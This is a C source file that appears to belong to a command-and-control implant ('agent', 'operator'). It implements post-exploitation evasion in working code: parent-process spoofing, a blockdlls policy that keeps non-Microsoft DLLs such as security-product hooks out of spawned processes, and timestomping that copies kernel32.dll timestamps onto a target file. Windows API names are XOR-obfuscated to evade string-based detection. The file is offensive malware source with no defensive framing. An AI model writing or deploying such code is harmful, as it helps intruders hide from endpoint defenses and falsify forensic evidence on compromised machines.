/*
 * evasion_postex.c — Post-exploitation evasion:
 *   PPID spoofing, blockdlls, timestomp.
 *
 * These are used when the agent (or operator) needs to spawn a child process
 * or manipulate file metadata on the target.
 */
#include "agent.h"
#include "evasion.h"
#include "api_resolve.h"

/* ─── PROC_THREAD_ATTRIBUTE constants (MinGW may not define these) ─── */

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS \
    ((DWORD_PTR)0 | 0x00020000 /* ProcThreadAttributeValue(0, FALSE, TRUE, FALSE) */)
#endif

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY \
    ((DWORD_PTR)7 | 0x00020000 /* ProcThreadAttributeValue(7, FALSE, TRUE, FALSE) */)
#endif

#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON \
    ((DWORD64)1 << 44)
#endif

#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

/* Import InitializeProcThreadAttributeList / UpdateProcThreadAttribute */
typedef BOOL (WINAPI *pInitializeProcThreadAttributeList)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *pUpdateProcThreadAttribute)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T,
    PVOID, PSIZE_T);
typedef void (WINAPI *pDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);


/* ═══════════════════════════════════════════════════════════════════
 *  PPID SPOOFING + BLOCKDLLS (combined)
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_create_process_ppid_spoof(
    const wchar_t *command_line,
    DWORD parent_pid,
    BOOL block_dlls,
    PROCESS_INFORMATION *pi_out)
{
    char _sk[] = {'k'^0x5A,'e'^0x5A,'r'^0x5A,'n'^0x5A,'e'^0x5A,'l'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sk[_i];_i++) _sk[_i]^=0x5A;
    HMODULE hK32 = GetModuleHandleA(_sk);
    SecureZeroMemory(_sk, sizeof(_sk));
    if (!hK32) return FALSE;

    char _si[] = {'I'^0x5A,'n'^0x5A,'i'^0x5A,'t'^0x5A,'i'^0x5A,'a'^0x5A,'l'^0x5A,'i'^0x5A,'z'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
    for(int _i=0;_si[_i];_i++) _si[_i]^=0x5A;
    pInitializeProcThreadAttributeList pInit =
        (pInitializeProcThreadAttributeList)GetProcAddress(hK32, _si);
    SecureZeroMemory(_si, sizeof(_si));

    char _su[] = {'U'^0x5A,'p'^0x5A,'d'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,0};
    for(int _i=0;_su[_i];_i++) _su[_i]^=0x5A;
    pUpdateProcThreadAttribute pUpdate =
        (pUpdateProcThreadAttribute)GetProcAddress(hK32, _su);
    SecureZeroMemory(_su, sizeof(_su));

    char _sd[] = {'D'^0x5A,'e'^0x5A,'l'^0x5A,'e'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
    for(int _i=0;_sd[_i];_i++) _sd[_i]^=0x5A;
    pDeleteProcThreadAttributeList pDelete =
        (pDeleteProcThreadAttributeList)GetProcAddress(hK32, _sd);
    SecureZeroMemory(_sd, sizeof(_sd));

    if (!pInit || !pUpdate || !pDelete)
        return FALSE;

    /* Open parent process */
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent)
        return FALSE;

    /* Count attributes: 1 for PPID, optionally +1 for blockdlls */
    DWORD attrCount = block_dlls ? 2 : 1;

    /* Get required size */
    SIZE_T attrListSize = 0;
    pInit(NULL, attrCount, 0, &attrListSize);

    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!attrList) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!pInit(attrList, attrCount, 0, &attrListSize)) {
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    /* Attribute 1: PPID spoof */
    if (!pUpdate(attrList, 0,
                 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                 &hParent, sizeof(HANDLE), NULL, NULL))
    {
        pDelete(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    /* Attribute 2: Block non-Microsoft DLLs (optional) */
    DWORD64 mitigationPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    if (block_dlls) {
        pUpdate(attrList, 0,
                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                &mitigationPolicy, sizeof(mitigationPolicy), NULL, NULL);
    }

    /* Create process with spoofed PPID */
    STARTUPINFOEXW si;
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;

    /* CreateProcessW needs a writable command line buffer */
    wchar_t cmdBuf[4096];
    wcsncpy(cmdBuf, command_line, 4095);
    cmdBuf[4095] = L'\0';

    BOOL result = CreateProcessW(
        NULL,
        cmdBuf,
        NULL, NULL,
        FALSE,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        &si.StartupInfo,
        pi_out
    );

    pDelete(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    return result;
}


/* ═══════════════════════════════════════════════════════════════════
 *  BLOCKDLLS ONLY (no PPID spoof)
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_create_process_blockdlls(
    const wchar_t *command_line,
    PROCESS_INFORMATION *pi_out)
{
    char _sk2[] = {'k'^0x5A,'e'^0x5A,'r'^0x5A,'n'^0x5A,'e'^0x5A,'l'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sk2[_i];_i++) _sk2[_i]^=0x5A;
    HMODULE hK32 = GetModuleHandleA(_sk2);
    SecureZeroMemory(_sk2, sizeof(_sk2));
    if (!hK32) return FALSE;

    char _si2[] = {'I'^0x5A,'n'^0x5A,'i'^0x5A,'t'^0x5A,'i'^0x5A,'a'^0x5A,'l'^0x5A,'i'^0x5A,'z'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
    for(int _i=0;_si2[_i];_i++) _si2[_i]^=0x5A;
    pInitializeProcThreadAttributeList pInit =
        (pInitializeProcThreadAttributeList)GetProcAddress(hK32, _si2);
    SecureZeroMemory(_si2, sizeof(_si2));

    char _su2[] = {'U'^0x5A,'p'^0x5A,'d'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,0};
    for(int _i=0;_su2[_i];_i++) _su2[_i]^=0x5A;
    pUpdateProcThreadAttribute pUpdate =
        (pUpdateProcThreadAttribute)GetProcAddress(hK32, _su2);
    SecureZeroMemory(_su2, sizeof(_su2));

    char _sd2[] = {'D'^0x5A,'e'^0x5A,'l'^0x5A,'e'^0x5A,'t'^0x5A,'e'^0x5A,'P'^0x5A,'r'^0x5A,'o'^0x5A,'c'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'A'^0x5A,'t'^0x5A,'t'^0x5A,'r'^0x5A,'i'^0x5A,'b'^0x5A,'u'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'i'^0x5A,'s'^0x5A,'t'^0x5A,0};
    for(int _i=0;_sd2[_i];_i++) _sd2[_i]^=0x5A;
    pDeleteProcThreadAttributeList pDelete =
        (pDeleteProcThreadAttributeList)GetProcAddress(hK32, _sd2);
    SecureZeroMemory(_sd2, sizeof(_sd2));

    if (!pInit || !pUpdate || !pDelete)
        return FALSE;

    SIZE_T attrListSize = 0;
    pInit(NULL, 1, 0, &attrListSize);

    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!attrList) return FALSE;

    if (!pInit(attrList, 1, 0, &attrListSize)) {
        HeapFree(GetProcessHeap(), 0, attrList);
        return FALSE;
    }

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    pUpdate(attrList, 0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            &policy, sizeof(policy), NULL, NULL);

    STARTUPINFOEXW si;
    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;

    wchar_t cmdBuf[4096];
    wcsncpy(cmdBuf, command_line, 4095);
    cmdBuf[4095] = L'\0';

    BOOL result = CreateProcessW(
        NULL, cmdBuf, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, &si.StartupInfo, pi_out
    );

    pDelete(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);

    return result;
}


/* ═══════════════════════════════════════════════════════════════════
 *  TIMESTOMP
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_timestomp(const wchar_t *target_path, const wchar_t *donor_path) {
    /*
     * Copy creation/access/write times from donor file to target file.
     * Default donor: C:\Windows\System32\kernel32.dll
     */
    const wchar_t *donor = donor_path;
    wchar_t defaultDonor[MAX_PATH];

    if (!donor || !*donor) {
        GetSystemDirectoryW(defaultDonor, MAX_PATH);
        wcscat(defaultDonor, L"\\kernel32.dll");
        donor = defaultDonor;
    }

    /* Read timestamps from donor */
    HANDLE hDonor = CreateFileW(donor, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hDonor == INVALID_HANDLE_VALUE)
        return FALSE;

    FILETIME ftCreate, ftAccess, ftWrite;
    BOOL got = GetFileTime(hDonor, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hDonor);

    if (!got)
        return FALSE;

    /* Apply timestamps to target */
    HANDLE hTarget = CreateFileW(target_path, FILE_WRITE_ATTRIBUTES,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hTarget == INVALID_HANDLE_VALUE)
        return FALSE;

    BOOL set = SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hTarget);

    return set;
}
